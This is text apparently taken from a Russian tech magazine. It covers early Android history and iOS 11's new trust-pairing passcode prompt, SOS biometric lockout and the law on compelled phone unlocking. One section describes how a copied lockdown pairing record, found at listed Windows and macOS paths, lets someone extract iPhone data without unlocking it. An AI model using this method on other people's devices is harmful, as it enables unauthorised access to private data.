определять местоположение по сотовым выш кам и GPS и даже уме ли стро‐
ить маршруты).





                 Кон такты и последние вызовы (m3)

Замет но, что m3 имеет больше общего с обычными кнопочными телефонами
и на iOS он абсолют но ничем не похож. Зато теперь мы зна ем, откуда в ста‐
рых смар тфо нах с Android есть кноп ка «Меню» — это аналог правой клавиши
(или клавиши «Опции») на обычном телефо не.
  В свое вре мя Android m3 мог бы стать отличным конкурентом Symbian
и кнопоч ным телефонам. Сравнивать его с Android 8 не име ет смысла. Срав‐
нивать Android m5 c новым Android 8 тоже не стоит, это явно концепт, который
в Google в спеш ке выкатили после релиза iPhone.




 • Android m3 — 12 ноября 2007 года. Вер сия API: неизвестно. Вер сия ядра
   Linux: неизвес тно. Это первая бета‐вер сия, доступная публично.
 • Android m5 — 13 февраля 2008 года. Версия ядра: 2.6.23. Версия API:
   неизвестно.
 • Android 0.9 — 18 августа 2008 года. Версия ядра: 2.6.25. Версия API: неиз‐
   вес тно. Это релиз‐кандидат. Почти стабильная версия.
 • Android 1.0 — 23 сентября 2008 года. Версия API: 1. Версия ядра: 2.6.25.
  Первая стабиль ная версия, то есть релиз.
 • Android 1.1 — 9 февраля 2009 года. Версия API: 2. Версия ядра: 2.6.25.
 • Android 1.5 — 30 апреля 2009 года. Вер сия API: 3. Вер сия ядра: 2.6.27.
 • Android 1.6 — 15 сентября 2009 года. Версия API: 4. Версия ядра: 2.6.29.

Первый смартфон на ОС Android называл ся HTC Dream (также известен как T‐
Mobile G1). Он работал под управле нием Android 1.0 (пер вая сборка TC4‐
RC19,  датируемая  13  сен тября  2008  года)  и был  выпущен  в  про‐
дажу 31 октября 2008 года. В скором вре мени он получил обновление до An‐
droid 1.1 и далее обновлялся вплоть до Android 1.6.





                                     Продолжение статьи →
X‐MOBILE              ← НАЧАЛО СТАТЬИ





           КАКОЙ БЫЛА ПЕРВАЯ ВЕРСИЯ
        САМОЙ ПОПУЛЯРНОЙ ОС И КАК
         ОНА МЕНЯЛАСЬ СО ВРЕМЕНЕМ





Android 1.0–1.5
Пос ле загрузки видим экран бло кировки. По современным мер кам он выг‐
лядит ужасно, но поч ти не уступает экрану из Android Oreo. Разве что про‐
пущенных событий и уве домлений не хватает. Для раз блокировки устройства
нуж но нажать кнопку «Меню». Никакие свайпы тут не работают.





                        Эк ран блокировки

Ла унчер выг лядит зна комо. Он при нял вид, в котором будет оставаться
вплоть до версии Android 1.6. Он име ет поддержку виджетов и ярлыков,
которые мож но свободно перемещать по рабочему столу. В целом концепция
такая же, как и в Pixel Launcher, который установлен по умолчанию в Android
7+. За тем исключени ем, что он не уме ет авто матически перемещать ярлыки
на свободное место и не поз воляет менять размер виджетов.





                      Домашний экран

Как ни странно, в 1.0 не было настро ек, они появи лись только в 1.5.





                     Настройки в Android 1.5

Панель уведом лений присутствует, но в сравнении с современными вер‐
сиями ее функции сводятся только к двум вещам: возможности нажать на уве‐
домление, чтобы открыть приложение, и возможности смах нуть уведомление.
Никакой панели быстрых нас троек, никаких настро ек показа уведомления
и их блокировки. Уве домления не могут раз ворачи ваться и содержать кнопки.
И конечно же, здесь нет позаимствован ной из iOS фун кции Heads Up, которая
выводит плаш ку с уведомлением в верхней час ти экра на.





                     Панель уведом лений

Карты в 1.0 до сих пор работают. Они умеют отображать объекты (например,
магазины),  однако  не  показы вают  дополнительные  данные,  такие
как телефон, часы работы, посещаемость. Нет функции быс трого поис ка поб‐
лизос ти нуж ных заведений (больниц, кафе, баров, заправок, супермаркетов
и про чего). Зато по сей день работает режим просмотра улиц. Поддержки
мультитача нет, да и вооб ще пользоваться крайне неудобно.





                             Карты

В браузе ре появилась поддер жка вкладок! Очень важные изменения про‐
изош ли и внутри: соз датели явно обновили дви жок браузе ра. Теперь он кор‐
ректно распознается сайтами как мобильный бра узер (да, в m5 и ниже бра‐
узер пытался загружать тяжело весную стра ницу для ПК) и работает куда быс‐
трее. Удалось открыть главную стра ницу нашего жур нала. При попытке прос‐
мотреть статью браузер вылетел. Впрочем, как я позже выяснил, браузер
любит вылетать при откры тии тяжеловесных сайтов с кучей скриптов и гра‐
фики.





                 Браузер (слева), галерея (справа)





          Му зыкальный плеер (слева), сообщения (справа)




 1. m3 — версия для кно почных смартфо нов без сен сорного экра на. Элемен‐
   ты интерфейса мелкие, преобла дают чер ный и синий цвета. При сутс тву ет
  мно жество эффектов анимации, меню и мно гие другие эле менты полуп‐
   розрач ные. Кнопки в стиле старой macOS.
 2. m5 — интерфейс полностью переде лан под сенсорные экраны, элемен ты
   управления стали намного крупнее. Многие эффекты анимации пропали.
  В интерфей се пре обладает белый цвет.
 3. 3.0 — новая тема оформления Holo (от Holographic): темный фон, яркие
   эле менты  управле ния  с  пря мыми  линиями  и  эффектом  све чения.
   Экранные кла виши навигации вмес то аппаратных.
 4. 4.0 — тот же Holo без эффекта све чения. Тем ный фон пре обла дает,
   но так же используется белый.
 5. 5.0 — Material Design, переко чевавший также и в дру гие продукты Google.
   Яркий плос кий интерфейс с тенями и сложными эффектами анимации.





                                     Продолжение статьи →
X‐MOBILE              ← НАЧАЛО СТАТЬИ





           КАКОЙ БЫЛА ПЕРВАЯ ВЕРСИЯ
        САМОЙ ПОПУЛЯРНОЙ ОС И КАК
         ОНА МЕНЯЛАСЬ СО ВРЕМЕНЕМ





ТЕХНИЧЕСКИЕ АСПЕКТЫ
Ес ли судить по начинке HTC Dream, рекомен дуемые сис темные требования
Android 1.0 были примерно такими:
 • сенсорный экран с раз решени ем 320×480;
 • клавиши приема и отбоя вызова, кнопки «Меню», «Домой», «Назад»;
 • процессор 528 МГц;
 • ОЗУ 192 Мбайт;
 • ПЗУ 256 Мбайт.

Однако наше небольшое расследова ние подтверждает (см. скриншоты) —
ОС вполне мог ла бы уместиться в 128 Мбайт ПЗУ. На эмулируемом устрой‐
стве под системный раздел отведено 64 Мбайт, из которых системой
занято 42,3 Мбайт, а под будущие обновления оставлено 23,2 Мбайт. В /
data (данные программ и сторонние приложения) из 64 Мбайт занято 29,8,
а сво бод но 35,7. Под кеш выделено тоже 64 Мбайт, однако требуется ему
только 1,1. В ито ге: система занимает 73 Мбайт, а остальное можно оставить
под сторонние приложе ния, которые в то время не час то весили больше
мегабайта.




                        Рас пределение ПЗУ

Достаточный для работы ОС объем ОЗУ — 64 Мбайт, во‐первых, потому, что
в эмулято ре система прекрасно обходится 92, а во‐вторых, в ста рые времена
китайцы клепали смартфо ны с 64 Мбайт и они прекрасно работа ли (как вла‐
делец одно го из таких, подтверждаю. — Прим. ред.).





                        Распределение ОЗУ

Пос мотрим, что представ лял собой образ с системой. Для этого распакуем
system.img. В сжатом виде этот образ занимает всего 26 Мбайт, а пос ле
рас паковки — 41,3 Мбайт. По сегод няшним меркам, когда обычное приложе‐
ние может весить 100 Мбайт, это прос то копейки. Однако это пол ноценная
операци онная система, которая умеет многое из того, что умеет современ‐
ный Android.





           Структура каталогов Android 1.0 (слева) и 7.1 (спра ва)

Все системные приложения и сервисы находятся в катало ге app. В современ‐
ном Android при ложе ния с осо быми привилегиями (в основном это сис‐
темные сервисы) вынесены в отдельный каталог priv‐app.
  Откры ваем app и видим великое чудо: программы занимают ничтожно
мало места. Самые жир ные: лаунчер (1,32 Мбайт) и браузер (0,98 Мбайт).
Встре чаются  приложе ния  размером мень ше 100  Кбайт  (дик тофон —
44,4 Кбайт, калькулятор — 86,1 Кбайт, просмотр улиц — 94,9 Кбайт).





                   Это все при ложения Android 1.0

Заг лянем в пап ку etc. Тут хранятся кон фигурационные файлы (нас тройки)
раз личных сис темных ути лит. Интерес представляет каталог otacerts. Судя
по названию и файлам, содержащимся в нем, Android 1.0 поддержи вает OTA‐
обновле ния.
   Катало га lib64 нет, ОС не поддерживает 64‐бит ные приложе ния. Биб‐
лиотеки Java‐классов (framework) занима ют всего 6,3 Мбайт (в срав нении
с 251,3 Мбайт в современной вер сии).
  Вы полняем команду mount и узнаем, что Android изна чально использовал
файловую  систему  yaﬀs2,  предназна ченную  для  работы  на флешках
с высоким уровнем износа (в то время качес тво NAND‐памяти оставляло
желать лучшего, часто появлялись битые сектора). Yaﬀs была однопоточной
файловой  системой  с  низкой  производительностью,  поэтому  в  вер‐
сии  2.3 программисты Google ее выпилили, заменив на клас сичес кую
для систем на ядре Linux ext4.
  Еще одна осо бенность Android 1.0 — отсутс твие JIT‐ком пилятора. Офи‐
циальным язы ком Android всег да был Java, но в качестве виртуальной
машины для исполнения при ложений здесь исполь зовалась более эффектив‐
ная в пла не потребле ния памяти регистро вая ВМ Dalvik (в про тивовес сте‐
ковой виртуальной машине Java). Она хоть и была менее требовательной
к опе ративной памяти, но серь езно проигрывала обычной Java в скорости
исполне ния приложе ний.
   Google исправила это только в версии 2.2, реализовав наконец JIT‐ком‐
пилятор, который вместо интерпретации байт‐кода на лету переводил его
в машинные инструкции. В Android 5.0 ему на смену пришел AOT‐ком пилятор,
который конверти ровал прог рамму в машин ные инс трукции при установке,
замедляя таким образом процесс инстал ляции и лишая виртуальную машину
многих воз можностей оптимизации.
   Чтобы это испра вить, в  Android 7 решили использовать гибридный
JIT/AOT‐компилятор.  Сразу  после  установ ки  приложение  исполняется
с  исполь зовани ем  JIT‐ком пилято ра, но  во  время  простоя смартфона
на  зарядке  подклю чает ся  AOT‐компилятор  и  перегоняет  приложение
в машинные инструкции с помощью AOT‐компилято ра (на самом деле все
нам ного слож нее, но для объяснения нюан сов пот ребова лась бы отдель ная
статья).
  Интересно, что в Android 1.0 уже были песоч ницы для приложений.
И реали зованы они были весьма любопытно. Каждое при ложе ние запус‐
калось от име ни отдельного пользователя Linux и, таким обра зом, имело дос‐
туп только к сво ему катало гу внутри /data/data.





  Катало ги при ложений при надлежат разным пользовате лям и доступны
  для чтения и модификации только им

Друг с другом и с опе раци онной системой при ложе ния могли общаться толь‐
ко через IPC‐механизм Binder, который тре бовал авторизации на выпол нение
дей ствий. Этот же механизм исполь зовал ся и для несколько дру гих целей:
с его помощью сис тема оповещала приложения о системных событиях, таких
как входящий вызов, пришедшее SMS, втыкание заряд ки и так далее. При‐
ложения получали сообщения и мог ли на них отреагировать.
   Из‐за этой особенности в Android были широкие воз можности автомати‐
зации, о которых мы знаем благодаря таким приложениям, как Tasker, Auto‐
mate или Locale. Все эти при ложения доступны и для Android 8, разве что
некоторые опасные воз можности, такие как вклю чение и вык лючение режима
полета, теперь запрещены для исполь зования обычными приложениями.
  В Android 1.0 не было поддержки push‐уведомлений и никаких ограниче‐
ний на работу при ложений в фоне. Последним час то пользовались кривору‐
кие разработ чики, соз давав шие приложе ния, которые быстро выжирали
заряд аккумулятора. Google испра вила эту проб лему толь ко в Android 8, зап‐
ретив запуск фоновых служб (правда, до нее это же успе ли сделать раз работ‐
чики китай ских про шивок вроде MIUI).
   Ну и самое глав ное — первый Android тор мозил. И тормозил он вплоть
до вер сии 3.0, которая наконец научилась использовать графичес кий про‐
цессор для обработки 2D‐графики. Почему такой фун кции не было изначаль‐
но? Прос то потому, что Android должен был работать на всем, включая самые
дешевые смар тфо ны, в которые в то время графичес кий ускоритель не пре‐
дустанав ливали.


ПАРАДОКС НОВИЗНЫ И БЕЗОПАСНОСТИ
Год от года разработ чики Google добав ляли в Android новые механиз мы
защиты. Поэто му на пер вый взгляд может показать ся, что Android 1.0 и 8.0 —
это как Windows 95 и 10 в плане безопас ности. Но это не совсем так. Как мы
уже выяснили, в дизай не ОС изначально существовали песоч ницы для при‐
ложений, IPC‐механизм и система раз решений с многоуров невой провер кой
пол номочий (вплоть до ядра Linux). Большая часть ОС была написана на язы‐
ке Java, из‐за своего дизай на не поз воляющем писать код, в котором можно
вызвать переполнение буфера, выйти за гра ницы мас сива, повторно исполь‐
зовать освобож денную память и применять другие приемы взлома.
  Однако со вре менем опе рационная система обрастала новыми функци‐
ями и воз можнос тями. А чем сложнее и длин нее код, тем труд нее его отла‐
живать и исправ лять ошиб ки. По мере раз вития системы появлялись целые
под системы, пригодные для экс плуатации злоумышленни ками.
  Нап ример, в 1.0 не было мультимеди абиблиотеки stagefright (она появи‐
лась в Android 2.3), в которой наш ли массу уяз вимостей, позволяющих взло‐
мать смартфон, отправив на него MMS или попросив пользовате ля открыть
спе циальную ссылку.
  В Android 1.0 не было и сер виса Accessibility («Специальные воз можнос‐
ти»), с помощью которого мож но получить пол ный контроль над смартфоном.
Не было так же режима администратора, который так любят использовать
вирусы, что бы защититься от удаления.
  С другой сто роны, тог да не сущес твовало мно гих внед ренных позже
средств защиты: SELinux, Seccomp, системы запроса полномочий приложе‐
ния и управле ния ими, механизма про верки целостности системы Veriﬁed
Boot, который появился в Android 4.4, но полноценно начал работать только
в 7.0, шиф рования данных, защиты от даунгрейда, онлайн‐антивируса Verify
Apps, работающе го со времен 4.2. На самом деле ты даже PIN‐код не мог
установить на экран.





В январе 2009 года в Android Market появи лась Opera Mini 4.2. Инте ресна она
прежде всего тем, что это самая обычная Opera Mini 4.2 для телефо нов,
которая работает внут ри эмулято ра Java ME. Отображает страницы до сих
пор прекрасно (спасибо серверу сжатия).





Один из самых ори гинальных лаун черов для Android. Показы вает много
полез ной информации на главном экране. Прекрасно работает в 1.5.





В то вре мя это была все го лишь обер тка для мобильной версии сайта. До сих
пор работают все функции.





Файловый менеджер с прекрасным набором фун кций даже по сегодняшним
меркам. Занимает все го 1,87 Мбайт.





ЗАКЛЮЧЕНИЕ
Android 1.0 определенно очень интересная ОС. Она весьма компактна, может
работать в усло виях жес ткого огра ничения ресур сов. Архитектура Android
изначально была правильной, и было бы глупо говорить о том, что в нор маль‐
ную опе рационную систему Android превратился толь ко недавно.
X‐MOBILE





     КАК IOS 11 ЗАЩИТИТ ТЕБЯ
    ОТ ПРОИЗВОЛА ПОЛИЦИИ
      И ПОГРАНИЧНИКОВ





Мы уже расска зывали о нов шествах iOS 11:
новый «Центр управле ния», мно гоза дач‐
ность, ARKit. Это интересные изменения,
но не такие важные, как новые механизмы
защиты. В  этой  статье мы  расскажем,           Олег Афонин                                                                                      Эксперт по мобильной
как iOS 11 сох ранит твои данные в безопас‐       криминалистике«Элкомсофт»компании
ности,  защитит  тебя  от  пог ранич ников        aoleg@voicecallcentral.com
и  полицейских,  жела ющих  покопаться
в смартфоне.


ПРЕДЫСТОРИЯ
Эта  статья —  результат  исследова ний,  про веденных  в  лаборатории
«Элкомсофт». По ито гам этих исследований была опубликована статья,
которая неожи данно вызвала широчайший резонанс в американских, британ‐
ских и даже немецких СМИ. Исследование обсуждалось в таких изданиях,
как The Verge, Mashable, Heise.de, Gizmodo, ARS Technica, Fortune, и осве‐
щалось в специфичес ких юридических журналах. Шквал публикаций не зат‐
ронул русскоязычных читателей: в нашей стра не дру гие законы, другие пра ва
и тре бования.
  Мы рассмот рим не только то, что, собственно, сде лали в Apple, но и то,
как это повлияет на безопасность данных пользователей в разных странах.
Осо бенно инте ресно будет сравнить последствия чис то технических шагов
для поль зовате лей из США и России.


ПРОТИВОДЕЙСТВИЕ ДОСМОТРУ
В одном из предыдущих выпус ков мы подробно рассмат ривали, что может
и чего не может делать с телефоном пог раничник. Мы выяс нили, что пог‐
раничник имеет право потребовать от пользователя раз блокировать устрой‐
ство; может и унести его в неизвестном нап равле нии.
   Что про исходит с разблокированным телефоном за закрытыми дверями?
С помощью несложной процедуры с устройства снимается образ данных (для
iPhone, как правило, используется опе рация соз дания резер вной копии),
пос ле чего образ анализируется с помощью спе циализированного програм‐
много обеспечения. Плохо здесь как то, что в резервную копию попадают
абсо лютно все твои пароли из связки ключей Keychain, так и то, что вся эта
информация останется в руках государс тва на много лет. Не хочешь, чтобы
за тобой сле дили? Тогда тебе придется менять все пароли от сохраненных
в связке клю чей учетных записей.
  Правовой статус подобных действий весь ма сом нителен. Да, у тебя есть
право сто ять на своем и не разблокировать телефон — но у тех же аме рикан‐
ских пограничников, в свою очередь, есть пра во посадить тебя на обратный
рейс  или,  если  ты американский  граж данин,  прос то  задержать  тебя
без предъявле ния обвинения.
  Похоже, в Apple в кур се ситуации, и они решили вставить пал ки в колеса
как ведомству, обеспечивающему охра ну границ, так и полицейским, которые
по вадились разбло киро вать устрой ства отпечатками пальцев на осно ве весь‐
ма сомнительных орде ров.
   Как это было сделано? Все го одно небольшое нововведение — и жизнь
пограничников и полицей ских зна чительно осложня ется.


УСТАНОВЛЕНИЕ ДОВЕРИЯ: ТЕПЕРЬ ПОД ПАРОЛЕМ
Что было раньше? Пограничнику дос таточно было зас тавить тебя разбло‐
киро вать телефон (как пра вило, при помощи сканера отпечат ков пальцев).
Далее iPhone можно под ключить к компьюте ру и сливать данные при помощи
iTunes или спе циали зированного соф та. Никаких дополнитель ных действий
не тре буется. Да, на резервную копию мож но установить пароль, в том числе
достаточно сложный; но, положа руку на сер дце, какой процент пользовате‐
лей вооб ще об этом зна ет? Статистика неумолима: процент — мизер ный.
  В iOS 11 подобным ситуациям нас тал конец. Давай сравним, что было
раньше и как стало теперь.


Что было раньше: iOS 8 — iOS 10
Для того что бы «связать» iPhone с компь ютером, в пре дыдущих версиях iOS
нуж но было выполнить следующие действия:
 1. Подключить iPhone к компьюте ру.
 2. Разблокировать iPhone паролем или с помощью датчика отпечат ков паль‐
   цев.
 3. Нажать «Доверять» на запрос «Доверять это му компьютеру?».
 4. Нажать «Продол жить» в iTunes.


Стало: iOS 11
С выходом iOS 11 пос ледовательность изменилась:
 1. Подключить iPhone к компьюте ру.
 2. Разблокировать iPhone паролем или с помощью датчика отпечат ков паль‐
   цев.
 3. Нажать «Доверять» на запрос «Доверять это му компьютеру?».
 4. Нажать «Продол жить» в iTunes.
 5. Если на iPhone уста нов лен пароль, то на экране телефона появится зап‐
   рос, требующий ввести пароль устройства, что бы под твердить установ‐
   ление доверен ного статуса. Криптогра фический ключ будет передан
   на компь ютер только после вво да коррек тно го пароля.

Итак, всего один неболь шой лиш ний шаг — и большие проблемы у тех, кто
попытается скачать данные с тво его iPhone. Только лишь данных Touch ID
теперь недос таточно для подклю чения телефо на к компьютеру. Да, погранич‐
ник по‐прежнему может потребовать у тебя разблокировать устройство.
Но теперь вместо того, что бы извлечь из него всю информацию и прогнать ее
через аналитическую прог рамму, ему придется вручную запус кать при ложе‐
ния на смартфо не и пытать ся разоб рать ся с его содержимым.
   Ну и пожалуй, самое важ ное: все твои пароли из связки ключей Keychain
таким обра зом останутся секретом. В iOS прос то не сущес твует (по понятным
при чинам) никакого механизма, который позволил бы кому угодно — даже
тебе самому — прос мотреть на телефо не сохраненные пароли. Так риск
утечки твоей персональной информации при пересечении границы сводится
к минимуму.


Юридические замороч ки
Что мешает полиции узнать у тебя пароль на смартфон? Именно здесь
на твою сто рону становит ся одно из кра еугольных положе ний юриспруден‐
ции, гласящее, что у каждого человека есть право не свидетельствовать про‐
тив самого себя. Таким образом, заставить тебя раз блокиро вать устрой ство,
при ложив твой палец или сфо тог рафировав твое лицо, полицейский или пог‐
раничник может (в случае с полицей скими потребуется ордер). А вот зас‐
тавить тебя сообщить пароль на устройство — это уже те самые показания,
которые ты имеешь право не давать, и настаивать в такой ситу ации работник
правоохранительных органов не имеет права.
  Разуме ется, детали могут раз личать ся в раз ных юрисдикциях. Мы свя‐
зались с работ никами правоохранительных органов раз ных стран. Результаты
были… разнооб разными. Так, в замечательной стране Турции подозрева‐
емый не может отка заться от выдачи пароля от устройства; в противном слу‐
чае против  него может быть выдвинуто обви нение  в  сокрытии  улик.
В Великобритании пароль от устрой ства прирав няли к отпечатку пальца; раз‐
блокиро вать устройство могут зас тавить. А вот в Соединенных Штатах,
на которые, собс твенно, и приходится пик продаж iPhone, от полиции тре‐
буют ся совер шенно различные телодвижения для того, чтобы разблокиро‐
вать устройство самос тоятельно, и для того, что бы потребовать использовать
отпе чаток пальца. Попросить сооб щить пароль полиция может (работа «на
испуг»), одна ко в слу чае отказа негативных последствий в суде для подоз‐
реваемого не будет.
  А как обсто ят дела в России? Нам удалось получить комментарий от пред‐
ста вителя МВД. Взгля нем на ситуацию со сто роны правоохранительных орга‐
нов.
   Во‐первых, есть разница между оперативно‐разыскными мероп риятиями
и следствием. Первое регули руется Законом об ОРД, второе — Уголов‐
но‐процессуальным кодексом, УПК.
   Во‐вторых, ни в том ни в другом случае по закону нет разницы между
получе нием отпе чатка (уточним: раз блокировкой отпечат ком) и паролем.
В каждом конкрет ном случае мож но использовать или и то и дру гое,
или ничего. Да, документы для суда готовятся разные — но раз ница здесь
не меж ду разбло кировкой с помощью отпе чатка пальцев или при помощи
пароля, а меж ду оперативно‐разыскной деятельностью и следс твием.
   В‐треть их, если в США действует Пятая поправка к конституции, то
у нас — 51‐я статья Консти туции, дающая право не свидетельствовать против
себя и сво их близких. Это озна чает, что если дело касается тебя или тво их
близких,  то  ты имеешь  право  отказаться  разбло кировать  устройство
с помощью датчика отпе чатков или сооб щать пароль; никаких неприятных
пос ледствий для тебя в этом случае не будет. Если же ты проходишь по делу
сви детелем, то за отказ раз блокировать телефон тебе могут вменить пре‐
пятс твование следствию со всеми вытека ющи ми.
   В‐четвертых, существу ет понятие особо тяж ких преступле ний, при которых
могут ограничить любые конституционные права. Сюда входят терак ты, эко‐
номи ческая безопас ность государства и прочее, по решению суда. Эта про‐
цедура — самая сложная и долгая; для того чтобы ква лифицировать прес‐
тупление как осо бо тяж кое, требует ся не менее двух дней. В iPhone датчик
отпе чатков и Face ID в любом случае бло кируются через 48 часов, но в рос‐
сий ских условиях тебе это никак не поможет: если твои консти туционные пра‐
ва ограничили, а пароль ты не говоришь, то вос препятство вание следствию
тебе обеспечено, даже если речь идет о твоем телефоне.
  Пятое и последнее. Если отпечатки в обязатель ном порядке снимают, ког‐
да в преступлении учас твовало оружие, то даже при ограблении это офор‐
мить уже сложнее. А если, скажем, разбил в магазине бутылку или сделал
неп риличную надпись на заборе — почти невозможно.


Как обойти
Разуме ется, нас сразу заин тересо вало, мож но ли обойти новый защитный
механизм iOS? Мы провели собствен ное рас следование… Оказалось —
можно. Но не всегда.
  При обме не данными между устрой ством с iOS и компьютером исполь‐
зуются крип тографические клю чи. Точнее говоря, для каждой связки исполь‐
зует ся пара асимметричных клю чей, один из которых создается в памяти
iPhone (и защищается Secure Enclave), а второй передается на компьютер,
где и сох раняется в виде файла — так называемо го lockdown‐файла или pair‐
ing record. Для того что бы два устройства могли обме ниваться информацией,
требуют ся оба ключа — и тот, который находится в устройстве, и тот, который
сохранен на компь юте ре.
   Так  вот, если  извлечь lockdown‐файл  из компьюте ра пользовате ля
и положить его в соот ветству ющую папку iTunes на своем компьютере (а луч‐
ше — вос поль зовать ся специали зирован ным инс трументом наподобие El‐
comsoft iOS Forensic Toolkit), то для копирования данных из iPhone не придет‐
ся даже раз блокиро вать его экран.
   Есть, прав да, одно но: если смар тфон был выключен или перезагружал ся
с момента пос ледней раз блокиров ки, то магия не сра бота ет. После перезаг‐
рузки в устройстве зашиф ровано буквально все, включая части ключей
доверенных компьюте ров, и рас шифруются данные только пос ле первого
ввода пароля.
   Где взять эти клю чи? В папке данных iTunes, местоположение которой
зависит от версии операционной системы компь ютера.
 • Windows Vista, 7, 8, 8.1, Windows 10: %ProgramData%\Apple\Lockdown;
 • Windows XP: %AllUsersProfile%\Application Data\Apple\Lock
  down;
 • macOS: /var/db/lockdown.

Вот,  к примеру, содержимое файла 752c613e006babbd9d898f7a0a53cd‐
faaee28f72.plist — lockdown‐записи от одно го из наших устройств.





                 Содержимое lockdown‐файла

Достаточно получить этот файл, и iPhone мож но будет прос то подклю чить
к компьюте ру — необязательно даже раз бло кировать датчиком отпечатков!
  Интересно и то, что записи эти — без срока давности. Они будут дей стви‐
тель ны до бесконечности, точ нее — до полного сбро са телефона к завод‐
ским настройкам или до того, как поль зователь отзовет доверенный статус
у соответствующе го компь ютера. Воп рос на засыпку: как это сделать?
Думаю, отве та не знает почти никто, равно как практичес ки никто не догады‐
вается о самом существовании этой возможнос ти. Хочешь попытать ся найти
эту воз можность самостоятельно в настрой ках устрой ства? Удачи в нелегком
поиске! Разработчики спрятали ее в под пункте «Настрой ки → Основные →
Сброс → Сбро сить геонас тройки». Кстати, в английской версии название
этого пун кта более логичное — Reset Location & Privacy.


РЕЖИМ SOS
В iOS 11 появился еще один режим, призванный защитить поль зователя от…
Впро чем, не будем спешить.
   Итак, новый режим SOS активируется, если быстро нажать пять раз под‐
ряд кнопку питания. В этом случае пользователь получает меню с крупными
кнопками‐слайдерами. Теперь достаточно сдвинуть крас ную кнопку SOS,
и телефон автоматически наберет номер соответству ющей для текуще го
региона диспетчерской служ бы.
   Казалось бы, все предельно прозрачно. Или нет?
   У нового режима есть еще одна функция, совершенно незаметная.
При активации меню SOS система автоматически блокиру ет датчик отпечат‐
ков пальцев Touch ID (в iPhone X, соответс твен но, блокиру ется система рас‐
познавания лиц Face ID). Блокиров ка не сни мается, даже если меню убрать
нажати ем кнопки «Отмена». Таким образом, пользователь может быс тро заб‐
локировать  биомет рические  способы  авторизации,  оставив  пароль
на устройство в качестве единс твенной возможнос ти его раз блокиро вать.
  Более того, у иссле дователя нет никакой тех нической возможности опре‐
делить, был ли датчик Touch ID заб локирован таким способом, или же сис‐
тема потребовала пароль в соответствии с одним из множества правил.
О правилах мы писали ранее; в двух словах — данные отпечатка пальца уда‐
ляются, если поль зователь «слиш ком долго» не вводил пароль. Понятие
«слиш ком долго» плавающее; в свое время в «Элкомсофт» провели под‐
робное иссле дование на эту тему. Датчик отключает ся:
 • после пяти неудачных попыток;
 • после добав ления нового паль ца;
 • дистанционно через Find My Phone;
 • че рез 48 часов с момента последней раз блокировки;
 • че рез восемь часов с последней разблокиров ки любым способом, если
   пароль не вводился пос ледние шесть дней.

В любом из этих случаев мы уви дим точно такое же сооб щение, как то,
которое мы имели возможность наблюдать при демонс трации работы Face ID
во вре мя презен тации iPhone X.





                       Режимы SOS и Trust


Юридические замороч ки
Здесь начинается самое интересное. Не перечесть, сколько копий сло мано
вокруг блокировки смартфонов, их разблокиров ки полицией и требований
раз бло киро вать телефон, выдвинутых по отношению к подоз реваемым, обви‐
няемым и — да‐да! — просто прохожим. До сих пор ни в одной стране (кро‐
ме, пожалуй, Северной Кореи) не разработа но неп ротиворечивой законо‐
дательной базы, которая регулировала бы подобные вещи.
  Попробуем разобрать ся в ситуации на при мере практики, которая понем‐
ногу складывается в настоящий момент в США.
  Первое и основное: смар тфо ны, а точнее информация, которую они
содержат, рассмат риваются сейчас как важная часть доказа тельной базы.
Для конфискации смартфо на и для того, что бы взломать его без помощи
поль зовате ля, требуется ордер, ничем не отли чающийся от обычного орде ра
на обыск. Более того, изъять телефон полиция может и при обычном задер‐
жании; в этом случае на попыт ку взломать устрой ство ей пот ребу ется отдель‐
ный ордер.
  А вот заставить поль зователя разблокиро вать устрой ство полиция не име‐
ет права. (Экзотическую ситуацию с дос мотром на границе оставим сейчас
за скоб ками; мы уже подробно обсу дили ее в одном из предыдущих выпус‐
ков.) Если быть точным, полицейский может вежливо попросить или уверен‐
ным голосом пот ребовать, чтобы задержанный разблокировал устройство.
ДЕЛАТЬ ЭТОГО НЕ СЛЕДУЕТ, и вот почему.
   Во‐первых, у тебя есть право отказать ся от дачи показаний. Разблокиро‐
вание устрой ства — это именно дача показа ний, даже если полицейский
всем сво им видом демонстрирует, что это не так. Все твои показания могут
быть и будут исполь зованы против тебя, а вот отказ от дачи показаний против
тебя исполь зовать нельзя. Более того, никакая часть твоих показаний, если
ты будешь давать их при задержании, никогда не будет использована в твою
поль зу!
  Примеры? Вот пер вый (этот слу чай весь ма характерен). Последователь‐
ность событий была такой: во время рутинного досмотра, без предъявле ния
обви нений, полиция остановила 19‐летнего Дарвина Уоке ра. Полицей ский
попросил (пот ребовал?) доступ в телефон пока‐еще‐не‐задержанного Дар‐
вина. Тот согласился и телефон раз блокиро вал.
  Просмотрев содер жимое устрой ства, полиция обна ружила фотографии
девуш ки Дар вина в не сов сем одетом виде. Полиции показа лось, что девуш‐
ке нет 18 лет (дальнейшие события показали, что она была на два года млад‐
ше Дарвина); на этом основании Дарвин был задер жан (детская порногра‐
фия, можно сесть на много лет тюрьмы). Дарвин был отпу щен под залог, пос‐
ле  чего  восполь зовался  функцией  дистанционного  удаления  данных
с телефо на. Дан ные были успешно уда лены, доказательств не осталось.
Разозленная полиция выдвинула обви нение в противо действии пра восу дию.
   Какие выводы можно сделать из этой прекрасной истории?
 1. Первое и самое глав ное: всех этих неприятностей мож но было избежать,
   просто отказав шись разбло кировать устройство. У полиции не было
   никаких пре тензий к Дар вину, и откажись он — его просто отпустили бы.
 2. Вто рое:  никакими  способами  взло мать  телефон Дарвина  полиция
   не смогла бы (это iPhone 5s, для которого на тот момент — 2015 год —
   просто не существо вало методов разбло кировки через взлом загрузчи ка);
  доб раться до зашифрованных данных не получилось бы.
 3. Третье: у задер жанного есть полное право не сообщать пароль устрой‐
   ства. Отказ сооб щить пароль не может быть использован против него
   в суде.
 4. Четвертое: единственным легальным спо собом для полиции разблокиро‐
   вать iPhone Дар вина было бы получение ордера и насиль ственное прик‐
   ладывание пальца Дарвина к датчику Touch ID.

Вот именно от последне го, единственно легаль но воз можно го для полиции
сце нария и призвана защитить новая функция SOS.
  А вот сов сем другой при мер, недавний. Здесь все еще инте ресней:
полиция ворвалась в здание, воору жившись орде ром, который давал им пра‐
во на «…прик ладывание отпечат ков пальцев, в том числе больших пальцев,
каждого челове ка, который находится в здании в момент про веде ния обыска
и у которо го, по мне нию полиции, может быть устройство, оборудованное
датчиком отпечатков пальцев, если таковое устройство также находится
в здании в момент проведения обыска».
  Сам факт выдачи такого ордера вызвал бурю негодования; спустя пол года
ордер признают незакон ным и ситуацию отыг рают назад, но тем не менее —
полиция УЖЕ про вела рейд и УЖЕ раз блокировала устройства с помощью
отпе чатков пальцев их владельцев.
